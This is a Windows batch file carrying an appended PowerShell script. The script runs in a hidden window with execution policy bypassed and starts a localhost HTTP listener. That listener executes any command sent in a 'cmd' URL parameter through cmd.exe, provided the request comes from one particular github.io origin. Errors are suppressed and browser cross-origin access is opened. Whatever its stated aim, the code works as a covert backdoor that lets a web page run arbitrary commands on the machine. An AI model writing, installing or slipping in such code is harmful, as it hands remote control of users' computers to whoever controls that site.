@echo off
start "" /min powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$f='%~f0';$t=(Get-Content $f -Encoding UTF8) -join [char]10;$i=$t.LastIndexOf('__HYX_PS_CODE__');& ([scriptblock]::Create($t.Substring($i+15)))"
exit /b

__HYX_PS_CODE__
$ErrorActionPreference='SilentlyContinue'
$port=17890
$origin='https://tianlansedexiaoniu.github.io'
$ep=New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Loopback),$port
$ls=New-Object System.Net.Sockets.TcpListener $ep
$ls.Start()
while($true){
try{
$cl=$ls.AcceptTcpClient();$st=$cl.GetStream();$rd=New-Object System.IO.StreamReader $st
$ln=$rd.ReadLine();if(-not $ln){$cl.Close();continue}
$pa=$ln -split ' ';$me=$pa[0];$path='/';if($pa.Count -gt 1){$path=$pa[1]}
$hd=@{}
while($true){$h=$rd.ReadLine();if($null -eq $h -or $h -eq ''){break};$kv=$h -split ':',2;if($kv.Count -eq 2){$hd[$kv[0].Trim().ToLower()]=$kv[1].Trim()}}
$og='';if($hd.ContainsKey('origin')){$og=$hd['origin']}
$hv='';if($hd.ContainsKey('host')){$hv=$hd['host']}
$ok=(($hv -eq ('127.0.0.1:'+$port)) -or ($hv -eq ('localhost:'+$port))) -and ($og -eq $origin)
$code='403 Forbidden';$body=''
if($ok){
if($me -eq 'OPTIONS'){$code='200 OK'}
elseif($path -match '[?&]cmd=([^&]+)'){
$cmd=[System.Uri]::UnescapeDataString($matches[1])
Start-Process cmd.exe -ArgumentList ('/c '+$cmd)
$code='200 OK'
}
}
$len=[System.Text.Encoding]::UTF8.GetByteCount($body)
$resp="HTTP/1.1 $code`r`nContent-Type: text/plain; charset=utf-8`r`nAccess-Control-Allow-Origin: $origin`r`nAccess-Control-Allow-Methods: GET, OPTIONS`r`nAccess-Control-Allow-Headers: Content-Type`r`nAccess-Control-Allow-Private-Network: true`r`nCache-Control: no-store`r`nConnection: close`r`nContent-Length: $len`r`n`r`n$body"
$by=[System.Text.Encoding]::UTF8.GetBytes($resp);$st.Write($by,0,$by.Length);$st.Flush();$cl.Close()
}catch{}
}
